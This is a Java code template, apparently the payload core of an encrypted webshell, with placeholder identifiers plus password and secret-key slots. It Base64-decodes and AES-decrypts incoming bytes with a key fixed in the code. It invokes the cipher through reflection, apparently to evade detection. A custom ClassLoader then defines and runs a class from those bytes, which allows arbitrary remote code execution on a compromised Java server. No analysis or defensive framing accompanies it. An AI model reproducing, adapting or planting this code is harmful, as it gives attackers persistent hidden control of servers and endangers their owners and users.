public static String {strer}(byte[] {strershiyi}) {
        try {
            java.util.Base64.Encoder {strjiu} = java.util.Base64.getEncoder();
            return {strjiu}.encodeToString({strershiyi});
        } catch (Exception e) {return null;}
    }
public static byte[] {strsan}(String {strershiyi}) {
        try {
            java.util.Base64.Decoder {strshi} = java.util.Base64.getDecoder();
            return {strshi}.decode({strershiyi});
        } catch (Exception e) {return null;}
    }class {strshiyi} extends ClassLoader {
        public {strshiyi}(ClassLoader {strershier}) {
            super({strershier});
        }
       public Class Q(byte[] {strershi}) {
    try {
        return super.defineClass(null, {strershi}, 0, {strershi}.length);
    } catch (ClassFormatError e) {
        return null;}}}
public byte[] {strershisan}(byte[] s, boolean m) {
    try {
        Class<?> {stryi} = Class.forName("javax.crypto.Cipher");
        java.lang.reflect.Method {strliu} = {stryi}.getMethod("getInstance", String.class);
        Object {strshiwu} = {strliu}.invoke(null, "AES");
        Class<?> {strsi} = Class.forName("javax.crypto.spec.SecretKeySpec");
        java.lang.reflect.Constructor<?> {strwu} = {strsi}.getConstructor(byte[].class, String.class);
        Object {strshijiu} = {strwu}.newInstance({strshisi}.getBytes(), "AES");
        java.lang.reflect.Method {strqi} = {stryi}.getMethod("init", int.class, java.security.Key.class);
        {strqi}.invoke({strshiwu}, m ? 1 : 2, {strshijiu});
        java.lang.reflect.Method {strba} = {stryi}.getMethod("doFinal", byte[].class);
        return (byte[]) {strba}.invoke({strshiwu}, (Object) s);
    } catch (Exception e) {
        return null;
    }
}String {strshisan} = new String({strsan}("{pass}"));
        String {strshisi} = new String({strsan}("{secretKey}"));